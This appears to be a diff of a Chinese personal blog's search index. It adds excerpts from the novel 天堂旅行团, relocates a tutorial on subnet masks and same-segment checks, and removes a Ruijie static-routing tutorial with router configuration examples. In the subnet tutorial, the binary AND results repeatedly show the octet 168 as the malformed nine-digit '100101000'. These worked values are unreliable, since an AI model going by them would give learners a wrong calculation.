+         data-id="1891034510" data-server="netease" data-type="song" data-mode="circulation" data-autoplay="false" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#C20C0C"
+    ></div>
+
+
+
+<h2 id="内容简介"><a href="#内容简介" class="headerlink" title="内容简介"></a>内容简介</h2><p>该书讲述了一个默默无闻的小人物平凡却惊心动魄的人生。几乎要被生活碾压成泥的主人公宋一鲤，意外踏上一场有关生命意义与救赎的治愈之旅。</p>
+<p>宋一鲤的不理想人生，大概要从五岁时，父母婚姻不睦、父亲离家出走算起。刚强的母亲，独自承担起抚养儿子的责任。直至十岁，老家传来父亲病故的噩耗，少年宋一鲤的心里才开始真正地恨上了父亲——那个永远将自己丢在人间的男人。</p>
+<p>随着年龄的增长，宋一鲤像其他普通人一样生活学习，并与大学同学林艺结了婚。可在母亲病倒后，一切都变了。宋一鲤搞不清，这个弯是在哪儿拐的？他与妻子接手了家里的小饭馆，不仅无法照顾母亲，妻子也因不甘心这样生活而提出离婚。宋一鲤一下子被生活打懵了，不知道自己错在哪儿？除了借酒浇愁，做什么都打不起精神。宋一鲤觉得自己没有尽到做儿子、丈夫的责任，没法给母亲、妻子创造更好的生活。</p>
+<p>癌症女孩小聚，就像位天使，降临到了宋一鲤的“人间”。她不仅保护了宋一鲤，还赋予了他重新面对生活的勇气。因为小聚嚷着要去看演唱会，宋一鲤不得不开着他那辆破烂面包车，带着小聚从南京出发，去了武汉，去昆明，再去南昌，一路上遇见了很多人，打了好几场架，管了不少闲事。旅途中，宋一鲤的世界忽然开阔了，不再纠缠于自己在夜里数也数不清的伤痕。他亲眼看见了他人的痛苦与勇敢，看见了他人的责任与担当</p>
+<p>来自：<a href="https://baike.baidu.com/item/%E5%A4%A9%E5%A0%82%E6%97%85%E8%A1%8C%E5%9B%A2/58293831?fr=aladdin">百度百科</a></p>
+<h2 id="摘抄"><a href="#摘抄" class="headerlink" title="摘抄"></a>摘抄</h2><blockquote>
+<p>遇见你，就像跋山涉水遇见一轮明月，以后天黑心伤，就问那天借一点月光。</p>
+</blockquote>
+<br>
+
+<blockquote>
+<p>月亮在远方坠落，浪潮在堤岸破碎，统统不能回到原点。</p>
+</blockquote>
+<br>
+
+<blockquote>
+<p>月亮永远都在，悬挂于时间长河之中。我从前一天来，要找的人是你。你往后一天去，不是我要找的人了。</p>
+</blockquote>
+<br>
+
+<blockquote>
+<p>她突然的来，突然的走。我慢慢明白，人与人之间没有突然，她想好了才会来，想清了才会走。</p>
+</blockquote>
+<br>
+
+<blockquote>
+<p>世界是有尽头的，在南方洋流的末端，冰山漂浮，云和水一起冻结。</p>
+</blockquote>
+<br>
+
+<blockquote>
+<p>时间治愈不了一切，她只会把泥泞日复一日的堆积。</p>
+</blockquote>
+<br>
+
+<blockquote>
+<p>我从前一天来，要找的人是你。你往后一天去，不是我要找的人了。</p>
+</blockquote>
+<br>
+
+<blockquote>
+<p>一个人内心有裂痕的时候，都是静悄悄的，这个世界没人能察觉，只有当他砰的一声碎开，大家才会听到。</p>
+</blockquote>
+<br>
+
+<blockquote>
+<p>你这个人就是棵荒草，别人稍微爱你一下，就恨不得把心都掏出来。但你是棵荒草啊，能掏出什么来，最多最多，把自己点着了，让人家暖一下手。</p>
+</blockquote>
+<br>
+
+<blockquote>
+<p>孤独来自于生命中那些重要的人，他们的影子扎根在旧时光，笑容不知道去了何方。</p>
+</blockquote>
+<br>
+
+<blockquote>
+<p>世界上的一万种苦难，不为谁单独降临，也不为谁网开一面。可我想，窒息之前，总要有一口属于我的空气。</p>
+</blockquote>
+<br>
+
+<blockquote>
+<p>那些过不去的日子，从天而降，连绵不绝，像一条无穷无尽的隧道。</p>
+</blockquote>
+<br>
+
+<blockquote>
+<p>没有去过四海，穿过四季，谁也不想困在出生就挣扎的原地。</p>
+</blockquote>
+<br>
+
+<blockquote>
+<p>一无所有的时候，说明你该拥有的，还没到来。</p>
+</blockquote>
+<br>
+
+<blockquote>
+<p>命运怎么安排那是它的事，我有我的安排。</p>
+</blockquote>
+<br>
+
+<blockquote>
+<p>月亮在远方堕落，浪潮在堤岸破碎，统统不能倒回原点。</p>
+</blockquote>
+<br>
+
+<blockquote>
+<p>他们还可以向前走，水迹会被阳光晒干，种子随风飘往四方，努努力，幸福触手可及。</p>
+</blockquote>
+<br>
+
+<blockquote>
+<p>愿我余生可以淋漓尽致，即使他们说，消灭痛苦最有效的方式，是降低期待，减少敏感。我依然愿意充满渴求，矢志不渝，并认真感受，无一遗漏。</p>
+</blockquote>
+<br>
+
+<blockquote>
+<p>天堂没有旅行团，我在世界尽头张望，等你回来，全人类睡得正香。</p>
+</blockquote>
+<br>
+
+<blockquote>
+<p>生命的终章，我踏上了一段旅途。开着破烂的面包车，穿越几十座城市，撕开雨天，潜入他乡，尽头是天堂。<br>浅蓝的天光，泛紫的云层，路灯嵌进夕阳。山间道路弥漫着一万吨水汽，密林卷来风声，我闯进无止境的夜里。<br>她说，天总会亮的。那么，我们一起记录下，凌晨前的人生。</p>
+</blockquote>
+]]></content>
+      <categories>
+        <category>小说</category>
+        <category>摘抄</category>
+      </categories>
+      <tags>
+        <tag>小说摘抄</tag>
       </tags>
   </entry>
   <entry>
@@ -7698,6 +7866,44 @@ switchport trunk allowed vlan only 10,20,30</code></pre>
       </tags>
   </entry>
   <entry>
+    <title>如何判断两台主机IP是否在同一网段</title>
+    <url>/posts/63b0beec/</url>
+    <content><![CDATA[<h2 id="什么是子网掩码"><a href="#什么是子网掩码" class="headerlink" title="什么是子网掩码"></a>什么是子网掩码</h2><p>子网掩码也称为网络掩码，地址掩码和子网遮罩。 它用于指示IP地址的哪些位标识主机所在的子网，哪些位标识为主机的位掩码。 子网掩码不能单独存在，必须与IP地址一起使用。 子网掩码仅具有一项功能，即将IP地址分为两部分，即网络地址和主机地址。子网掩码是一个32位地址，用于屏蔽IP地址的一部分，以区分网络ID和主机ID，并指示IP地址是在局域网上还是在广域网上。</p>
+<h2 id="子网掩码的功能"><a href="#子网掩码的功能" class="headerlink" title="子网掩码的功能"></a>子网掩码的功能</h2><p>子网掩码是一个32位地址，这是一种与IP地址结合使用的技术。 它具有两个主要功能。 一种是屏蔽IP地址的一部分，以区分网络ID和主机ID，并指示IP地址是在局域网上还是在远程网络上。 第二个是将大型IP网络划分为若干个小型子网。</p>
+<p>子网的使用是为了减少IP的浪费。 因为随着Internet的发展，创建了越来越多的网络，有些网络多达数百个，而有些只有少数，这浪费了大量IP地址，因此必须划分子网。 使用子网可以提高网络应用程序的效率。</p>
+<p>通过计算机的子网掩码判断两台计算机是否属于同一网段的方法是将计算机的十进制IP地址和子网掩码转换为二进制形式，然后执行二进制AND计算（全1则得1，不全1则得0）。 如果结果相同，则两台计算机属于同一网段。</p>
+<h2 id="如何根据掩码来确定IP地址网段"><a href="#如何根据掩码来确定IP地址网段" class="headerlink" title="如何根据掩码来确定IP地址网段"></a>如何根据掩码来确定IP地址网段</h2><p>A主机：IP地址：192.168.1.10 	  	子网掩码：255.255.255.192 	(掩码位26)</p>
+<p>B主句：IP地址： 192.168.1.100		子网掩码：255.255.255.192 	(掩码位26)</p>
+<p>C主机：IP地址： 192.168.1.20		   子网掩码：255.255.255.192 	(掩码位26)</p>
+<p>首先将IP地址和子网掩码转为32位二进制数字</p>
+<p>然后在IP地址和子网掩码做与运算</p>
+<p>A主机：</p>
+<p>IP地址：					11000000  ：10101000  ：00000001  ：00001010</p>
+<p>子网掩码：				11111111  ：11111111  ：11111111  ：11000000</p>
+<p>与运算结果：		11000000  ：100101000  ：00000001 ：00000000</p>
+<p>B主机：</p>
+<p>IP地址：					11000000  ：10101000  ：00000001  :    01100100</p>
+<p>子网掩码：				11111111  ：11111111  ：11111111  ：11000000</p>
+<p>与运算结果：		11000000  ：100101000  ：00000001 ：01000000</p>
+<p>C主机：</p>
+<p>IP地址：					11000000  ： 10101000  ：00000001  ：00010100</p>
+<p>子网掩码：				11111111  ：11111111  ：11111111  ：11000000</p>
+<p>与运算结果：		11000000  ：100101000  ：00000001 ：00000000</p>
+<p>判断与运算结果是否相同</p>
+<p>A主机与运算结果	11000000  ：100101000  ：00000001 ：00000000</p>
+<p>B主机与运算结果	11000000  ：100101000  ：00000001 ：01000000</p>
+<p>C主机与运算结果	11000000  ：100101000  ：00000001 ：00000000</p>
+<p>A主机和C主机与运算结果相同，所以A主机C主机在同一网段，B主机没有与AC主机在同一网段</p>
+]]></content>
+      <categories>
+        <category>学习</category>
+        <category>网络基础</category>
+      </categories>
+      <tags>
+        <tag>网络</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>如何彻底关闭Hyper-V</title>
     <url>/posts/8dc48be7/</url>
     <content><![CDATA[<p>许多第三方虚拟化应用程序无法与 Hyper-V同时工作。 受影响的应用程序包括 VMware Workstation 和 VirtualBox。 这些应用程序可能无法启动虚拟机，或者可能回退到较慢的模拟模式。</p>
@@ -7790,44 +7996,6 @@ mountvol X: &#x2F;d</code></pre>
       </categories>
       <tags>
         <tag>windows</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>如何判断两台主机IP是否在同一网段</title>
-    <url>/posts/63b0beec/</url>
-    <content><![CDATA[<h2 id="什么是子网掩码"><a href="#什么是子网掩码" class="headerlink" title="什么是子网掩码"></a>什么是子网掩码</h2><p>子网掩码也称为网络掩码，地址掩码和子网遮罩。 它用于指示IP地址的哪些位标识主机所在的子网，哪些位标识为主机的位掩码。 子网掩码不能单独存在，必须与IP地址一起使用。 子网掩码仅具有一项功能，即将IP地址分为两部分，即网络地址和主机地址。子网掩码是一个32位地址，用于屏蔽IP地址的一部分，以区分网络ID和主机ID，并指示IP地址是在局域网上还是在广域网上。</p>
-<h2 id="子网掩码的功能"><a href="#子网掩码的功能" class="headerlink" title="子网掩码的功能"></a>子网掩码的功能</h2><p>子网掩码是一个32位地址，这是一种与IP地址结合使用的技术。 它具有两个主要功能。 一种是屏蔽IP地址的一部分，以区分网络ID和主机ID，并指示IP地址是在局域网上还是在远程网络上。 第二个是将大型IP网络划分为若干个小型子网。</p>
-<p>子网的使用是为了减少IP的浪费。 因为随着Internet的发展，创建了越来越多的网络，有些网络多达数百个，而有些只有少数，这浪费了大量IP地址，因此必须划分子网。 使用子网可以提高网络应用程序的效率。</p>
-<p>通过计算机的子网掩码判断两台计算机是否属于同一网段的方法是将计算机的十进制IP地址和子网掩码转换为二进制形式，然后执行二进制AND计算（全1则得1，不全1则得0）。 如果结果相同，则两台计算机属于同一网段。</p>
-<h2 id="如何根据掩码来确定IP地址网段"><a href="#如何根据掩码来确定IP地址网段" class="headerlink" title="如何根据掩码来确定IP地址网段"></a>如何根据掩码来确定IP地址网段</h2><p>A主机：IP地址：192.168.1.10 	  	子网掩码：255.255.255.192 	(掩码位26)</p>
-<p>B主句：IP地址： 192.168.1.100		子网掩码：255.255.255.192 	(掩码位26)</p>
-<p>C主机：IP地址： 192.168.1.20		   子网掩码：255.255.255.192 	(掩码位26)</p>
-<p>首先将IP地址和子网掩码转为32位二进制数字</p>
-<p>然后在IP地址和子网掩码做与运算</p>
-<p>A主机：</p>
-<p>IP地址：					11000000  ：10101000  ：00000001  ：00001010</p>
-<p>子网掩码：				11111111  ：11111111  ：11111111  ：11000000</p>
-<p>与运算结果：		11000000  ：100101000  ：00000001 ：00000000</p>
-<p>B主机：</p>
-<p>IP地址：					11000000  ：10101000  ：00000001  :    01100100</p>
-<p>子网掩码：				11111111  ：11111111  ：11111111  ：11000000</p>
-<p>与运算结果：		11000000  ：100101000  ：00000001 ：01000000</p>
-<p>C主机：</p>
-<p>IP地址：					11000000  ： 10101000  ：00000001  ：00010100</p>
-<p>子网掩码：				11111111  ：11111111  ：11111111  ：11000000</p>
-<p>与运算结果：		11000000  ：100101000  ：00000001 ：00000000</p>
-<p>判断与运算结果是否相同</p>
-<p>A主机与运算结果	11000000  ：100101000  ：00000001 ：00000000</p>
-<p>B主机与运算结果	11000000  ：100101000  ：00000001 ：01000000</p>
-<p>C主机与运算结果	11000000  ：100101000  ：00000001 ：00000000</p>
-<p>A主机和C主机与运算结果相同，所以A主机C主机在同一网段，B主机没有与AC主机在同一网段</p>
-]]></content>
-      <categories>
-        <category>学习</category>
-        <category>网络基础</category>
-      </categories>
-      <tags>
-        <tag>网络</tag>
       </tags>
   </entry>
   <entry>
@@ -8575,390 +8743,6 @@ Ruijie(config-if-GigabitEthernet 0&#x2F;1)#spanning-tree bpdufilter enable</code
       </tags>
   </entry>
   <entry>
-    <title>路由技术介绍</title>
-    <url>/posts/f2727247/</url>
-    <content><![CDATA[<div class="danger">
-
-<blockquote>
-<p> 资料来源<a href="https://talent.ruijie.com.cn/certification/profession/">锐捷</a><br> 非原创</p>
-</blockquote>
-</div>
-
-<h2 id="路由技术介绍"><a href="#路由技术介绍" class="headerlink" title="路由技术介绍"></a>路由技术介绍</h2><h3 id="为什么需要路由"><a href="#为什么需要路由" class="headerlink" title="为什么需要路由"></a>为什么需要路由</h3><ul>
-<li>PC的网卡在进行发送数据的时候，网络层将检查目的IP与本网卡的IP地址是否处于一个网段<ul>
-<li>如果属于一个网段，则直接用ARP解析目的IP的MAC地址 </li>
-<li>如果不属于一个网段，则用ARP解析网关的MAC地址</li>
-</ul>
-</li>
-<li>二层交换网络（同一广播域&#x2F;VLAN）内，不同网段的主机之间无法直接通信</li>
-</ul>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104121.png" alt="1" loading="lazy"></p>
-<h3 id="路由的定义"><a href="#路由的定义" class="headerlink" title="路由的定义"></a>路由的定义</h3><ul>
-<li>从一个接口上收到数据包，根据数据包的目的地址进行定向和转发的过程 </li>
-<li>路由器依据路由表选择下一跳地址&#x2F;出接口并转发数据，实现跨IP网段通信</li>
-</ul>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104128.png" alt="2" loading="lazy"></p>
-<h4 id="直接路由数据通信分析"><a href="#直接路由数据通信分析" class="headerlink" title="直接路由数据通信分析"></a>直接路由数据通信分析</h4><ul>
-<li>直接路由：同一个IP网络内的通信 </li>
-<li>回想一下：同一个LAN中的PC1和PC2之间的通信过程：PC1&gt;ping 192.168.1.200</li>
-</ul>
-<ol>
-<li>PC1封装一个负载为ICMP Echo的IP报文：源IP&#x3D;192.168.1.100 目的IP&#x3D;192.168.1.200 </li>
-<li>PC1将IP报文封装到以太网帧中，源MAC为本地网卡的MAC，需要确定目的地的MAC </li>
-<li>PC1先判断目标IP是否处于本地子网，结果发现“是” 方式：本地IP与本地掩码是否等于目标IP与本地掩码，如果结果相等，则说明目标IP处于本地子网 </li>
-<li>查本地ARP缓存是否存在目标IP（PC2）对 应的MAC，如果不存在，则通过ARP获取</li>
-<li>成功封装以太网帧，源MAC为PC1的MAC， 目标MAC为PC2的MAC，从PC1网卡发出</li>
-<li>交换机根据MAC地址表转发以太网帧。</li>
-<li>PC2收到以太网帧，解封装出ICMP Echo 需要回复ICMP Reply的IP报文 源IP&#x3D;192.168.1.200 目的IP&#x3D;192.168.1.100</li>
-<li>PC2重复②-⑤的处理流程</li>
-</ol>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104133.png" alt="3" loading="lazy"></p>
-<h3 id="间接路由数据通信分析"><a href="#间接路由数据通信分析" class="headerlink" title="间接路由数据通信分析"></a>间接路由数据通信分析</h3><ul>
-<li>间接路由：不同IP网络内的通信 </li>
-<li>再思考一下：如果PC2与其他LAN中的PC3通信，又该如何：PC2&gt;ping 192.168.2.100</li>
-</ul>
-<p>1、PC2封装一个负载为ICMP Echo的IP报文：源IP&#x3D;192.168.1.200 目的IP&#x3D;192.168.2.100</p>
-<p>2、将IP报文封装到以太网帧中，源MAC为本地网卡的MAC，需要确定目的地的MAC</p>
-<p>3、PC2先判断目标IP是否处于本地子网，结果发现“不是” </p>
-<p>4、PC2如果配置了默认网关，查本地ARP缓存是 否存在网关IP对应的MAC，如果不存在，则通过 ARP获取ARP表项</p>
-<p>5、成功封装以太网帧，源MAC为PC2的MAC， 目标MAC为网关的MAC。由网卡接口发出</p>
-<p>6、交换机根据MAC地址表转发以太网帧，将会发送给网关</p>
-<p>7、网关路由器收到以太网帧，解封装出IP报文。根据报文中的目 标IP信息寻找出接口，在出接口重新封装以太网帧，再发出</p>
-<p>8、PC3收到以太网帧，解封装出ICMP Echo，需要回复ICMP  Reply，源IP&#x3D;192.168.2.100 目的IP&#x3D;192.168.1.200</p>
-<p>8、PC3收到以太网帧，解封装出ICMP Echo，需要回复ICMP  Reply，源IP&#x3D;192.168.2.100 目的IP&#x3D;192.168.1.200</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104140.png" alt="4" loading="lazy"></p>
-<h3 id="认识路由设备"><a href="#认识路由设备" class="headerlink" title="认识路由设备"></a>认识路由设备</h3><p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104144.png" alt="5" loading="lazy"></p>
-<h3 id="路由的下一跳"><a href="#路由的下一跳" class="headerlink" title="路由的下一跳"></a>路由的下一跳</h3><ul>
-<li>路由设备进行路由转发，下一台设备的端口IP地址 </li>
-<li>下一跳地址由路由表决定，PC客户端的默认下一跳地址通常称为“网关” <ul>
-<li>如图，PC2想要与PC3通信</li>
-</ul>
-</li>
-</ul>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104149.png" alt="6" loading="lazy"></p>
-<ul>
-<li>下一跳地址是路由设备根据路由表选择的最佳路径 <ul>
-<li>如图，PC2想要与PC3通信</li>
-</ul>
-</li>
-</ul>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104153.png" alt="7" loading="lazy"></p>
-<h3 id="路由表的构成与维护"><a href="#路由表的构成与维护" class="headerlink" title="路由表的构成与维护"></a>路由表的构成与维护</h3><p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104158.png" alt="8" loading="lazy"></p>
-<h3 id="路由表的构成"><a href="#路由表的构成" class="headerlink" title="路由表的构成"></a>路由表的构成</h3><p>路由表是路由器转发数据报文的判断依据。</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104202.png" alt="9" loading="lazy"></p>
-<h4 id="路由表的度量值"><a href="#路由表的度量值" class="headerlink" title="路由表的度量值"></a>路由表的度量值</h4><ul>
-<li>度量值（Metric）：路由协议用来衡量路径优劣的参数。表示到达目的地的代价总和</li>
-<li>影响度量值的因素：线路带宽、跳数、线路延迟·、线路使用率、线路可信度等</li>
-</ul>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104207.png" alt="10" loading="lazy"></p>
-<h3 id="路由表的内容"><a href="#路由表的内容" class="headerlink" title="路由表的内容"></a>路由表的内容</h3><p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104210.png" alt="11" loading="lazy"></p>
-<h3 id="管理距离"><a href="#管理距离" class="headerlink" title="管理距离"></a>管理距离</h3><ul>
-<li>管理距离（Administrative Distance），也叫优先级，用来衡量路由源的可信度 </li>
-<li>管理距离值越低，可信度越高。只有可信度最高的路由会被添加进路由表</li>
-<li>管理距离默认值由厂商自定义</li>
-</ul>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104214.png" alt="12" loading="lazy"></p>
-<h3 id="路由加表原则"><a href="#路由加表原则" class="headerlink" title="路由加表原则"></a>路由加表原则</h3><p>只有最佳路径才会被添加进路由表中，形成路由条目</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104217.png" alt="13" loading="lazy"></p>
-<h3 id="路由选路原则-——-最长子网掩码匹配原则"><a href="#路由选路原则-——-最长子网掩码匹配原则" class="headerlink" title="路由选路原则 —— 最长子网掩码匹配原则"></a>路由选路原则 —— 最长子网掩码匹配原则</h3><ul>
-<li><p>路由设备基于数据包的目的IP地址，按照最长子网掩码匹配原则查找路由表 </p>
-</li>
-<li><p>根据查询结果转发。查询无果则丢弃数据包</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104223.png" alt="14" loading="lazy"></p>
-</li>
-</ul>
-<h2 id="静态路由"><a href="#静态路由" class="headerlink" title="静态路由"></a>静态路由</h2><h3 id="静态路由-1"><a href="#静态路由-1" class="headerlink" title="静态路由"></a>静态路由</h3><ul>
-<li>由网络管理员手工配置的路由信息，当网络拓扑发生变化时，管理员需要手工修改静态路由信息 </li>
-<li>静态路由信息是本地有效的，不会传递给其他的路由器 </li>
-<li>静态路由一般适用于比较简单的网络环境，大型和复杂的网络环境通常不宜采用静态路由 使用静态路由好处是网络安全保密性高 </li>
-<li>使用全局配置命令ip route，配置静态路由 <ul>
-<li>下一跳地址必须是直连网络上可达的地址 </li>
-<li>点对点连接时，下一跳地址可用出接口代替</li>
-</ul>
-</li>
-</ul>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104229.png" alt="15" loading="lazy"></p>
-<h3 id="静态路由配置案例1-——-基础配置"><a href="#静态路由配置案例1-——-基础配置" class="headerlink" title="静态路由配置案例1 —— 基础配置"></a>静态路由配置案例1 —— 基础配置</h3><ul>
-<li>在3台路由器上配置静态路由，使Net 1与Net 2能互相通信 <ul>
-<li>选择100M链路，路径为：Net1-R1-R2-R3-Net2</li>
-</ul>
-</li>
-</ul>
-<pre class="language-none"><code class="language-none">R1(config)#ip route 192.168.2.0 255.255.255.0 172.16.1.2
-R2(config)#ip route 192.168.1.0 255.255.255.0 172.16.1.1
-R2(config)#ip route 192.168.2.0 255.255.255.0 172.16.1.6
-R3(config)#ip route 192.168.1.0 255.255.255.0 172.16.1.5</code></pre>
-
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104233.png" alt="16" loading="lazy"></p>
-<h3 id="静态路由配置案例1-——-查看静态路由"><a href="#静态路由配置案例1-——-查看静态路由" class="headerlink" title="静态路由配置案例1 —— 查看静态路由"></a>静态路由配置案例1 —— 查看静态路由</h3><ul>
-<li>在特权用户模式显示IP路由表<ul>
-<li>ruijie#show ip route</li>
-</ul>
-</li>
-<li>查看R1、R2和R3的路由表</li>
-</ul>
-<pre class="language-none"><code class="language-none">R1#show ip route
-C 192.168.1.0&#x2F;24 is directly connected, GigabitEthernet 0&#x2F;5
-C 172.16.1.0&#x2F;30 is directly connected, GigabitEthernet 0&#x2F;2
-C 172.16.1.8&#x2F;30 is directly connected, GigabitEthernet 0&#x2F;1 
-S 192.168.2.0&#x2F;24 [1&#x2F;0] via 172.16.1.2</code></pre>
-
-<pre class="language-none"><code class="language-none">R2#show ip route
-C 172.16.1.0&#x2F;30 is directly connected, GigabitEthernet 0&#x2F;2 
-C 172.16.1.4&#x2F;30 is directly connected, GigabitEthernet 0&#x2F;0
-S 192.168.1.0&#x2F;24 [1&#x2F;0] via 172.16.1.1
-S 192.168.2.0&#x2F;24 [1&#x2F;0] via 172.16.1.6</code></pre>
-
-<pre class="language-none"><code class="language-none">R3#show ip route
-C 172.16.1.4&#x2F;30 is directly connected, GigabitEthernet 0&#x2F;0
-C 192.168.2.0&#x2F;24 is directly connected, GigabitEthernet 0&#x2F;5
-C 172.16.1.8&#x2F;30 is directly connected, GigabitEthernet 0&#x2F;1
-S 192.168.1.0&#x2F;24 [1&#x2F;0] via 172.16.1.5</code></pre>
-
-
-
-<h3 id="静态路由配置案例2-——-默认路由"><a href="#静态路由配置案例2-——-默认路由" class="headerlink" title="静态路由配置案例2 —— 默认路由"></a>静态路由配置案例2 —— 默认路由</h3><ul>
-<li>默认静态路由是特殊的静态路由，它的目标网络和子网掩码均为0.0.0.0（默认路由有可能是动态路由）</li>
-<li>在R1和R3上配置默认路由，使R1与R3的100M链路故障时，可以使用10M链路</li>
-</ul>
-<pre class="language-none"><code class="language-none">R1(config)#ip route 0.0.0.0 0.0.0.0 172.16.1.10
-R3(config)#ip route 0.0.0.0 0.0.0.0 172.16.1.9</code></pre>
-
-<pre class="language-none"><code class="language-none">R1#show ip route
-C 192.168.1.0&#x2F;24 is directly connected, GigabitEthernet 0&#x2F;5 
-C 172.16.1.0&#x2F;30 is directly connected, GigabitEthernet 0&#x2F;2
-C 172.16.1.8&#x2F;30 is directly connected, GigabitEthernet 0&#x2F;1
-S* 0.0.0.0&#x2F;0 [1&#x2F;0] via 172.16.1.10</code></pre>
-
-<pre class="language-none"><code class="language-none">R3#show ip route
-C 172.16.1.4&#x2F;30 is directly connected, GigabitEthernet 0&#x2F;0
-C 192.168.2.0&#x2F;24 is directly connected, GigabitEthernet 0&#x2F;5
-C 172.16.1.8&#x2F;30 is directly connected, GigabitEthernet 0&#x2F;1 
-S* 0.0.0.0&#x2F;0 [1&#x2F;0] via 172.16.1.9</code></pre>
-
-
-
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104239.png" alt="17" loading="lazy"></p>
-<h3 id="静态路由配置案例3-——-浮动静态路由"><a href="#静态路由配置案例3-——-浮动静态路由" class="headerlink" title="静态路由配置案例3 —— 浮动静态路由"></a>静态路由配置案例3 —— 浮动静态路由</h3><ul>
-<li>浮动路由就是在静态路由的基础上，加上管理距离参数，管理距离越小，可信度越高 </li>
-<li>配置了多条浮动路由，只有可信度最高（管理距离最小）的一条浮动路由会被添加到路由表中</li>
-<li>当可信度最高的浮动路由失效后，可信度次高的浮动会被添加到路由表中</li>
-<li>在R1和R3上配置浮动路由，使得正常状态路径为：Net1-R1-R2-R3-Net2 </li>
-<li>断开R1与R2、R3与R2的连接后，路径切换为：Net1-R1-R3-Net2</li>
-</ul>
-<pre class="language-none"><code class="language-none">R1(config)#ip route 192.168.2.0 255.255.255.0 172.16.1.2 10
-R1(config)#ip route 192.168.2.0 255.255.255.0 172.16.1.10 100
-R3(config)#ip route 192.168.1.0 255.255.255.0 172.16.1.5 10
-R3(config)#ip route 192.168.1.0 255.255.255.0 172.16.1.9 100</code></pre>
-
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104243.png" alt="18" loading="lazy"></p>
-<h3 id="静态路由配置案例3-——-查看浮动静态路由"><a href="#静态路由配置案例3-——-查看浮动静态路由" class="headerlink" title="静态路由配置案例3 —— 查看浮动静态路由"></a>静态路由配置案例3 —— 查看浮动静态路由</h3><ul>
-<li>配置完成后查看R1和R3的路由表</li>
-</ul>
-<pre class="language-none"><code class="language-none">R1#show ip route
-C 192.168.1.0&#x2F;24 is directly connected, GigabitEthernet 0&#x2F;5
-C 172.16.1.0&#x2F;30 is directly connected, GigabitEthernet 0&#x2F;2 
-C 172.16.1.8&#x2F;30 is directly connected, GigabitEthernet 0&#x2F;1
-S 192.168.2.0 &#x2F;24 [10&#x2F;0] via 172.16.1.2 </code></pre>
-
-<pre class="language-none"><code class="language-none">R3#show ip route
-C 172.16.1.4&#x2F;30 is directly connected, GigabitEthernet 0&#x2F;0
-C 192.168.2.0&#x2F;24 is directly connected, GigabitEthernet 0&#x2F;5 
-C 172.16.1.8&#x2F;30 is directly connected, GigabitEthernet 0&#x2F;1
-S 192.168.1.0 &#x2F;24 [10&#x2F;0] via 172.16.1.5 </code></pre>
-
-<ul>
-<li>断开R1与R2、R3与R2的连接后，查看R1和R3的路由表</li>
-</ul>
-<pre class="language-none"><code class="language-none">R1#show ip route
-C 192.168.1.0&#x2F;24 is directly connected, GigabitEthernet 0&#x2F;5
-C 172.16.1.8&#x2F;30 is directly connected, GigabitEthernet 0&#x2F;1
-S 192.168.2.0 &#x2F;24 [100&#x2F;0] via 172.16.1.10 </code></pre>
-
-<pre class="language-none"><code class="language-none">R3#show ip route
-C 192.168.2.0&#x2F;24 is directly connected, GigabitEthernet 0&#x2F;5
-C 172.16.1.8&#x2F;30 is directly connected, GigabitEthernet 0&#x2F;1
-S 192.168.1.0 &#x2F;24 [100&#x2F;0] via 172.16.1.9</code></pre>
-
-<h3 id="静态路由配置案例4-——-三层交换机上配置静态路由"><a href="#静态路由配置案例4-——-三层交换机上配置静态路由" class="headerlink" title="静态路由配置案例4 —— 三层交换机上配置静态路由"></a>静态路由配置案例4 —— 三层交换机上配置静态路由</h3><ul>
-<li>三层交换机也有路由功能，可实现不同VLAN间通信 </li>
-<li>在两个三层交换机上的SVI(switch virtual interface)口配置IP作为三层接口</li>
-<li>三层交换机之间的互联：（方案1）可以选择用trunk （方案2）也可以选择用三层路由接口</li>
-<li>在两台三层交换机上配置静态路由</li>
-</ul>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104249.png" alt="19" loading="lazy"></p>
-<ul>
-<li>SW1、SW2的SVI与静态路由配置 <ul>
-<li>通过给VLAN10、20、30、40、800配置IP地址并no shutdown，使交换机具有多个虚拟的路由口</li>
-<li>VLAN10、20、30、40的SVI地址可以分别作为相应VLAN内PC机的默认网关 </li>
-<li>（方案1）VLAN 800的SVI地址可以作为SW1与SW2直连通信的路由地址 </li>
-<li>通过配置静态路由，使不同VLAN、不同IP网络间的PC机能互相通信</li>
-</ul>
-</li>
-</ul>
-<pre class="language-none"><code class="language-none">SW1(config)#vlan 800
-SW1(config)#interface vlan 10
-SW1(config-if)#ip address 192.168.1.254 255.255.255.0
-SW1(config)#interface vlan 20
-SW1(config-if)#ip address 192.168.2.254 255.255.255.0 
-SW1(config)#interface vlan 800
-SW1(config-if)#ip address 10.0.0.1 255.255.255.252
-SW1(config)#ip route 192.168.3.0 255.255.255.0 10.0.0.2
